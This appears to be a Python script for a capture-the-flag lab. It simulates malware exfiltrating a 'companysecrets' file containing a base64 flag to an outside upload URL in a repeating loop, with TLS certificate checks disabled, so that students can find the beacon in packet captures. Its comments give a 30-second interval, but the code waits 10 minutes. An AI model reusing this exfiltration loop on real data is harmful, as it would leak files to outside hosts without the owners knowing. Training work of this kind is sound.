#This script will make a simple call to a remote IP with a payload.
#This can simulate a malicious program exfiltrating data or C2
#Everything is hard coded into the script, no arguments are passed. Change the IP and Port and Payload. Interval can also be adjusted.
#Student should find a payload being sent every 30 seconds in a packet dump.
#Inside the payload is a base64 encoded string
#Decoded it contains the CTF flag: CTF-Hax0r!

#!/usr/bin/env python3
import os
import time
from urllib.request import Request, urlopen
import mimetypes
from ssl import create_default_context

# Define the file name and remote URL
file_name = 'companysecrets.txt'
remote_url = 'https://practice.expandtesting.com/upload'  # Replace with your actual remote IP or URL

def create_file(file_name):
    current_directory = os.getcwd()
    full_path = os.path.join(current_directory, file_name)
    
    try:
        if not os.path.exists(current_directory):
            os.makedirs(current_directory)
        
        with open(full_path, 'w') as file:
            file.write("Q1RGLUhheDByIQ==")
        
        print(f"File '{file_name}' created successfully at {full_path}")
    
    except Exception as e:
        print(f"An error occurred while creating the file: {e}")

def post_file(remote_url, full_path):
    try:
        if not os.path.exists(full_path):
            raise FileNotFoundError(f"The file {full_path} does not exist.")
        
        with open(full_path, 'rb') as file:
            content = file.read()
            
            # Get the MIME type of the file
            content_type, _ = mimetypes.guess_type(full_path)
            if content_type is None:
                content_type = 'application/octet-stream'
            
            headers = {
                'Content-Type': f'{content_type}',
                'Content-Disposition': f'attachment; filename="{file_name}"'
            }
        
        request = Request(
            url=remote_url,
            data=content,
            headers=headers
        )
        
        # Create a custom SSL context that ignores certificate errors
        ssl_context = create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = 0
        
        with urlopen(request, context=ssl_context) as response:
            if response.status == 200:
                print("File posted successfully!")
            else:
                print(f"Failed to post file. Status code: {response.status}")
    
    except Exception as e:
        print(f"An error occurred while posting the file: {e}")

def main():
    current_directory = os.getcwd()
    full_path = os.path.join(current_directory, file_name)
    
    try:
        create_file(file_name)
        
        # Loop every 10 minutes
        while True:
            post_file(remote_url, full_path)
            time.sleep(600)  # Sleep for 10 minutes (600 seconds)

    except Exception as e:
        print(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    main()
